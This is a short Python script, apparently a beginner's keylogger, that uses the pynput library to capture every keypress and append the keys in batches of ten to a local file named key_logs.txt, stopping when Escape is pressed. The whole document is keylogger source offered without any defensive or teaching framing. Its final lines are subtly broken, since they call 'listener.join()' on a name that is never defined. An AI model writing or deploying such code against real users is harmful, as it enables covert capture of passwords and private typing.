import pynput
from pynput.keyboard import Key, Listener

count = 0
keys  = []

def press(key):
    global keys, count
    
    keys.append(key)
    count += 1
    
    if count >= 10:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open("key_logs.txt", "a") as f:
        for key in keys:
            f.write(str(key))

def release(key):
    if key == Key.esc:
        return False

with Listener(on_press = press, on_release = release) as Listener:
    listener.join()
